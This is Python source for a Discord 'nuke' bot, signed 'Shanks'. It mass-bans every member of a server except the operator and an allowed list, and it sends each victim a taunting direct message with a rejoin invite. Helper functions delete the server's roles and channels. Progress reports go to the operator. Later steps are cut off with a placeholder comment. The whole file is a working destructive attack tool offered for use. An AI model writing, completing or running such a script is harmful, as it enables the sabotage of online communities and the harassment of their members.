import os
import discord
import asyncio
import logging

logging.basicConfig(level=logging.INFO)

async def ban_member(member: discord.Member, reason: str = "Server Nuked by Shanks - Banned"):
    try:
        await member.ban(reason=reason, delete_message_days=0)
        logging.info(f"✅ Banned {member.name}#{member.discriminator} (ID: {member.id})")
        return True
    except discord.Forbidden:
        logging.error(f"❌ Forbidden: Cannot ban {member.name} - Missing permissions or role hierarchy issue.")
        return False
    except discord.HTTPException as e:
        logging.error(f"❌ HTTPException: {e} while banning {member.name}")
        return False
    except Exception as e:
        logging.error(f"❌ Unexpected error banning {member.name}: {e}")
        return False

async def delete_role(role: discord.Role):
    if role.name == "@everyone":
        return
    try:
        await role.delete()
        logging.info(f"✅ Deleted role {role.name}")
    except Exception as e:
        logging.error(f"❌ Error deleting role {role.name}: {e}")

async def delete_channel(channel: discord.abc.GuildChannel):
    try:
        await channel.delete()
        logging.info(f"✅ Deleted channel {channel.name}")
    except Exception as e:
        logging.error(f"❌ Error deleting channel {channel.name}: {e}")

async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.User, invite_link: str = None):
    logging.info(f"🔥 Starting nuke on {guild.name} (ID: {guild.id})")

    # Step 0: Invite link
    if not invite_link:
        text_channel = next((c for c in guild.channels if isinstance(c, discord.TextChannel)), None)
        if text_channel is None:
            try:
                temp_channel = await guild.create_text_channel("temp-invite")
                invite = await temp_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
                invite_link = invite.url
            except Exception as e:
                logging.error(f"❌ Could not create invite: {e}")
        else:
            try:
                invite = await text_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
                invite_link = invite.url
            except Exception as e:
                logging.error(f"❌ Could not create invite: {e}")

    if not invite_link:
        invite_link = "No invite could be created."

    # Check bot permissions
    bot_member = guild.me
    if not bot_member.guild_permissions.ban_members:
        logging.error("❌ Bot does not have 'Ban Members' permission. Nuke aborted.")
        await user.send("❌ Bot lacks 'Ban Members' permission. Cannot nuke.")
        return

    # Step 1: Ban members
    allowed_ids = [int(x.strip()) for x in os.getenv("ALLOWED_USERS", "").split(",") if x.strip().isdigit()]
    members_to_ban = [
        m for m in guild.members
        if m.id not in allowed_ids and m.id != bot.user.id and m.id != user.id
    ]

    logging.info(f"👥 Total members to ban: {len(members_to_ban)}")

    if len(members_to_ban) == 0:
        logging.warning("⚠️ No members to ban (maybe only bot and allowed users).")
        await user.send("⚠️ No members to ban. Check your allowed users list.")

    total = len(members_to_ban)
    for idx, member in enumerate(members_to_ban, 1):
        # Send DM
        try:
            dm = await member.create_dm()
            embed = discord.Embed(
                title="💀 You have been BANNED!",
                description=f"You were **banned** from **{guild.name}** by Shanks!",
                color=discord.Color.red()
            )
            embed.add_field(name="🔗 Rejoin", value=f"[Click to join]({invite_link})", inline=False)
            embed.add_field(name="🔥 Reason", value="Server Nuked by Shanks 💀", inline=True)
            embed.set_footer(text="👺 Join for more information!")
            await dm.send(embed=embed)
        except Exception as e:
            logging.warning(f"⚠️ Could not DM {member.name}: {e}")

        # Ban
        success = await ban_member(member)
        if not success:
            # If ban fails, log and continue
            logging.warning(f"⚠️ Failed to ban {member.name}, continuing...")

        # Progress update
        if idx % 10 == 0 or idx == total:
            try:
                await user.send(f"⏳ Progress: {idx}/{total} members banned...")
            except:
                pass

        await asyncio.sleep(1)  # rate limit

    # Step 2-4: roles, channels, etc. (same as before)
    # ...
    # (rest of code unchanged, but add logging)

    # After all bans, notify
    try:
        await user.send(f"✅ NUKE COMPLETE! Banned {total} members from {guild.name}.")
    except:
        pass
